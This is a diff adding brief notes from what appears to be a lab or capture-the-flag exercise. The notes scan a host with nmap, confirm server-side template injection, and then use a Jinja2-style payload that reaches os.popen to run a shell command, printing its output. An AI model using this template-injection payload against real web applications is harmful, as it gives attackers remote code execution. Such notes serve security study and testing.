@@ -1,0 +1,24 @@
+[Recon]
+sudo nmap -n -Pn --top-ports 1000 10.1.82.253
+
+Open ports:
+22/tcp open ssh
+80/tcp open http
+
+[Confirm SSTI]
+Input: {{7*7}}
+Output: 49
+
+[Inspect Template Context]
+Input: {{ self.__init__.__globals__ }}
+Output: globals dict visible (contains __builtins__ and __import__)
+
+[RCE: run pwd]
+Payload:
+{{ self.__init__.__globals__.__builtins__.__import__('os').popen('pwd').read() }}
+
+Output:
+/home/ubuntu
+
+[Result]
+pwd output: /home/ubuntu
